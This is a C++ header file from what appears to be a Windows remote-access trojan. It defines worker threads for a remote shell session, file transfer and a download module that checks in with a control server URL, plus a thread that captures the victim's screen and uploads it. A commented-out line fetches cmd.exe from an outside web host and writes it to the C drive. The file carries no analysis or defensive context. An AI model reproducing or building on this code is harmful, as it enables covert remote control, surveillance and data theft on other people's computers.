#if !defined(FUNCTIONTHREAD_H_INCLUDED)
#define FUNCTIONTHREAD_H_INCLUDED


#include "KernelManager.h"
#include "ShellManager.h"
#include "Tran.h"
#include "Download.h"
#include "Snap.h"


DWORD WINAPI ShellManagerThread(LPVOID lparam)
{   
	CKernelManager* pThis=(CKernelManager*)lparam;
	CClient	client;
	CShellManager	manager(&client);
	manager.m_id=pThis->m_id;
	manager.WaitEvent();

	printf("quited!!\n");
	
	pThis->m_hThread[COMMAND_SHELL-2]=NULL;
	pThis->m_nThreadCount--;
	return 0;
}

DWORD WINAPI TranThread(LPVOID lparam)
{
	CKernelManager* pThis=(CKernelManager*)lparam;
	CClient	client;
	CTran	tran(&client);
	tran.m_id=pThis->m_id;
	tran.WaitEvent();

	printf("quited!!\n");

	pThis->m_hThread[COMMAND_TRAN-2]=NULL;
	pThis->m_nThreadCount--;
	return 0;
}

DWORD WINAPI DownloadThread(LPVOID lparam)
{
	CKernelManager* pThis=(CKernelManager*)lparam;
	CClient	client;
	CDownload	download(&client);
	download.m_id=pThis->m_id;
    


	char* strVer="1";
	char PostData[32];
	sprintf(PostData,"ver=%s&id=%03d&type=download",strVer,download.m_id);
	client.post(ShellUrl,PostData);

	//URLDownloadToFile(NULL,"http://www.whitepig.org/cmd.exe","c:/cmd.exe",NULL,NULL);
	return 0;
}

DWORD WINAPI SnapThread(LPVOID lparam)
{
	CSnap snap;
	snap.CopyScreenToBitmap();
	snap.UploadPicture();
	return 0;
}

#endif